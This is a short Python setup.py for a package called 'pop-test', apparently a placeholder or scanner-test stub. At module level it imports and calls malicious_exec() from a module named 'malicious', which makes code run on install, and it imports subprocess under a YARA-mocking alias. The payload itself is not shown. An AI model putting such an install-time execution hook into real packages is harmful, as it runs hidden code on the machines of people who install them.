from distutils.core import setup
import subprocess as kekw_yara
from malicious import malicious_exec

malicious_exec()

setup(
  name = 'pop-test',
  packages = ['pop-test'],
  version = '0.3',
  license='MIT',
  description = 'Stop pepperonis from publishing this package',
  author = 'Michael Salsone',
  author_email = 'mike.salsone@gmail.com',
  url = 'https://github.com/popsiclestick/pop-test',
  download_url = 'https://github.com/popsiclestick/pop-test/archive/v_06.tar.gz',
  keywords = ['request', 'stub', 'dont', 'use', 'this'],
)
